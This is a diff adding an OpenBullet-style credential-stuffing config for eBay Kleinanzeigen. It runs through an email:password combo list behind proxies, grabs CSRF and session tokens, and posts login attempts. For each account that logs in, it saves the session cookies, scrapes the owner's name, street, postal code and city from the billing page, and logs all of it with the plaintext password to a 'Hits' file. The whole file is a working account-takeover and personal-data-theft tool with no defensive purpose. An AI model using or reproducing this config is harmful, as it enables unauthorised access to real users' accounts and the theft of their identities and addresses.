@@ -1,0 +1,187 @@
+[SETTINGS]
+{
+  "Name": "ebay-kleinanzeigen_3",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-07T04:40:28.2201284-07:00",
+  "AdditionalInfo": "",
+  "Author": "Gr3ym1nd",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GetStuff REQUEST GET "https://www.ebay-kleinanzeigen.de/m-einloggen.html?targetUrl=/m-meine-anzeigen.html&sessionExpired=true" 
+  
+  COOKIE "GCLB=CPX8-PmL0O_Pdw; _ga=GA1.2.2041669308.1603212089; _gid=GA1.2.2111705257.1603212089; rbzsessionid=88112128bac5c94f8f61a7077584cb1f; clientId=2041669308.1603212089; ekConsentTcf2={%22encodedConsentString%22: %22CO7lr4PO7lr4PE1ABADEA8CgAP_AAAAAAAYgG6Nf_X_fb3_j-_59__t0eY1f9_7_v20zjheds-8Nyd_X_L8X_2M7vB36pr4KuR4ku3bBAQdtHOncTQmR6IlVqTPsbk2Mr7NKJ7PEmlsbe2dYGH9_n9XT_ZKZ79_v___7________77______3_v7_8AAABISADAAEDdA0AGAAIG6CIAMAAQN0FQAYAAgboMgAwABA3QdABgACBuhCADAAEDdCUAGAAIG6FIAMAAQN0A.YAAAAAAAASA%22%2C%22customVersion%22:2%2C%22googleConsentGiven%22:true}; ekConsentBucketTcf2=full2-exp; iom_consent=0103ff03ff03ff&1603212092607; overlayV21=seen; __gads=ID=beea9bd437a91704:T=1603212125:S=ALNI_Mak0kYa8-bXqjjXukBcrPyyhVmy3A; rbzid=YPpZ1tgZBCOtrx+Uc3sPXjOzvCGxwSAM8aJ49xtbrVnFnZvy/lWUM1M38t8zVANw0EqCxtIAIvoPUktz+BavucNwg6CDZPUgnKUZNMVYNRKvlaee5tHfGsNF8fKrx8iqf7s4MNW6MWXgBONF0BcNR2qjcLHZNPlH/OnfD9birOQy8SikG+VTe27IYAmd7c3Pg9Dtrlhbw2EvsuqPrbSkuNsxt56YLee/cwkG0W3E1U9L5cmEQ6CMm74mxTUAEdR+GahI5sQHmBK4LfBY7j8EIRNIGoz7kSvpPXKeULGD9Kk=; up=%7B%22ln%22%3A%22599181219%22%2C%22lln%22%3A%22eacfa2ec-6b1c-4053-8732-026bfcb951e7%22%2C%22ls%22%3A%22k%3Dlogin%22%7D; uh=%7B%22sh%22%3A%22k%3Dlogin%22%7D; ioam2018=00173cb615031b2cc5f8f1357:1633020089135:1603212089135:.ebay-kleinanzeigen.de:3:ebaykanz:ebayK-2:noevent:1603212830656:y287ow; POPUPCHECK=1603299230659; JSESSIONID=143BB38866FE3A4BB1878EB5E093DA1B-mc5.koeb47-24_i01_1001; _gat=1" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+
+#CSRF PARSE "<SOURCE>" LR "name=\"_csrf\" value=\"" "\"" -> VAR "tt" 
+
+#SessID PARSE "<SOURCE>" LR "name=\"loginWenkseSessionId\" value=\"" "\"" -> VAR "tk" 
+
+#Login REQUEST POST "https://www.ebay-kleinanzeigen.de/m-einloggen.html" 
+  CONTENT "targetUrl=%2Fm-meine-anzeigen.html&loginWenkseSessionId=<tk>&loginMail=<USER>&password=<PASS>&_csrf=<tt>&fingerprint=f6136235541c47b04b27cf2ca32b66f1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.ebay-kleinanzeigen.de" 
+  HEADER "referer: https://www.ebay-kleinanzeigen.de/m-einloggen.html?targetUrl=/m-meine-anzeigen.html&sessionExpired=true" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 230" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Entweder hast du deine E-Mail-Adresse oder dein Passwort falsch eingegeben, oder du bist mit deiner E-Mail-Adresse noch nicht bei uns registriert. Bitte beachte, dass du dich auf eBay Kleinanzeigen nicht mit deinem eBay-Mitgliedsnamen einloggen kannst!" 
+  KEYCHAIN Success OR 
+    KEY "Ausloggen" 
+    KEY "Auf unserer Hilfeseite findest du Hinweise zur weiteren Vorgehensweise sowie eine Kontaktmöglichkeit zu eBay Kleinanzeigen" 
+
+#Cookies UTILITY File "Cookies\\[EBAY-KL]-[<USER>]-COOKIES.txt" WriteLines "www.ebay-kleinanzeigen.de	true	/	true	0	JSESSIONID	<COOKIES(JSESSIONID)>\\nwww.ebay-kleinanzeigen.de	true	/	true	1633310747	wl	<COOKIES(wl)>\\nwww.ebay-kleinanzeigen.de	true	/	true	1633310759	up	<COOKIES(up)>\\nwww.ebay-kleinanzeigen.de	true	/	true	0	sc	<COOKIES(sc)>" -> CAP "Cookies" 
+
+#Capture_Get REQUEST GET "https://www.ebay-kleinanzeigen.de/m-mein-profil.json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER "x-csrf-token: <tt>" 
+
+#Rating PARSE "<SOURCE>" JSON "averageRatingBucket" -> VAR "AverageRatingBucket" 
+
+IF "<AverageRatingBucket>" EqualTo ""
+SET CAP "AverageRatingBucket" "❌"
+ELSE
+SET CAP "AverageRatingBucket" "<AverageRatingBucket>"
+ENDIF
+
+#Rating2 PARSE "<SOURCE>" JSON "averageRatingBadge" -> VAR "AverageRatingBadge" 
+
+IF "<AverageRatingBadge>" EqualTo ""
+SET CAP "AverageRatingBadge" "❌"
+ELSE
+SET CAP "Zufriedenheit" "<AverageRatingBadge>"
+ENDIF
+
+#Since PARSE "<SOURCE>" JSON "userSince" -> VAR "since" 
+
+#Follower PARSE "<SOURCE>" JSON "followersCounter" -> VAR "follower" 
+
+#Ads PARSE "<SOURCE>" JSON "postedAds" -> VAR "ads" 
+
+#Historic PARSE "<SOURCE>" JSON "historicalPostedAds" -> VAR "historic" 
+
+#Capture_Get REQUEST GET "https://www.ebay-kleinanzeigen.de/m-rechnungsdaten.html" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-csrf-token: <tt>" 
+
+#ClearCookies FUNCTION ClearCookies 
+
+#Firstname PARSE "<SOURCE>" LR "<input id=\"invoice-firstName\" name=\"firstName\" class=\"formcontrol\" type=\"text\" value=\"" "\" maxlength=\"50\"/>" -> VAR "Vorname" 
+
+#Lastname PARSE "<SOURCE>" LR "<input id=\"invoice-lastName\" name=\"lastName\" class=\"formcontrol\" type=\"text\" value=\"" "\" maxlength=\"50\"/>" -> VAR "Nachname" 
+
+#Strasse PARSE "<SOURCE>" LR "<input id=\"invoice-street\" name=\"addressStreet\" class=\"formcontrol\" type=\"text\" value=\"" "\" maxlength=\"50\"/>" -> VAR "Strasse" 
+
+#PLZ PARSE "<SOURCE>" LR "<input id=\"invoice-addressZip\" name=\"addressZip\" class=\"formcontrol\" type=\"text\" value=\"" "\" maxlength=\"5\"/>" -> VAR "PLZ" 
+
+#Stadt PARSE "<SOURCE>" LR "<input id=\"invoice-addressCity\" name=\"addressCity\" class=\"formcontrol\" type=\"text\" value=\"" "\" maxlength=\"50\"/>" -> VAR "Stadt" 
+
+IF "<Vorname>" EqualTo ""
+SET CAP "Vorname" "❌"
+ELSE
+SET CAP "Vorname" "<Vorname>"
+ENDIF
+IF "<Nachname>" EqualTo ""
+SET CAP "Nachname" "❌"
+ELSE
+SET CAP "Nachname" "<Nachname>"
+ENDIF
+IF "<Strasse>" EqualTo ""
+SET CAP "Strasse" "❌"
+ELSE
+SET CAP "Strasse" "<Strasse>"
+ENDIF
+IF "<PLZ>" EqualTo ""
+SET CAP "PLZ" "❌"
+ELSE
+SET CAP "PLZ" "<PLZ>"
+ENDIF
+IF "<Stadt>" EqualTo ""
+SET CAP "Stadt" "❌"
+ELSE
+SET CAP "Stadt" "<Stadt>"
+ENDIF
+
+#IP REQUEST GET "http://ipinfo.io/ip" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+SET CAP "IP" "<SOURCE>"
+
+#Hits UTILITY File "Ebay-Kleinanzeigen-Hits.txt" AppendLines "👑 ~ ~ ~ ~ < 💚 EBAY-KLEINANZEIGEN 💚 > ~ ~ ~ ~ 👑\\n\\n⭐️ Combo : <USER>:<PASS>\\n👤 Name : <Vorname>, <Nachname> \\n🏬 Adresse : <Strasse>, <Stadt> <PLZ>\\n🎉 Nutzer Seit : <since>\\n🧾 Anzeigen : <ads>\\n✨ Rating (Zufriedenheit) : <Zufriedenheit>\\n👥 Followers : <follower>\\n💬 Historie : <historic>\\n🕵🏻‍♀️ User-Agent : Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36\\n🌎 IP : <IP>\\n🍪 Cookies : Yes (Cookies\\[EBAY-KL]-[<USER>]-COOKIES.txt)\\n🔒 Login : https://www.ebay-kleinanzeigen.de\\n⚡️ Config By Gr3ym1nd#ST ⚡️\\n\\n👑 ~ ~ ~ ~ < 💚 C O N F I G 💚 > ~ ~ ~ ~ 👑\\n" -> CAP "Hits" 
+
+!#CSV UTILITY File "Ebay-Kleinanzeigen-Hits.csv" AppendLines "<USER>;<PASS>;<since>;<avgbu>;<avgba>;<follower>;<ads>;<historic>" 
+
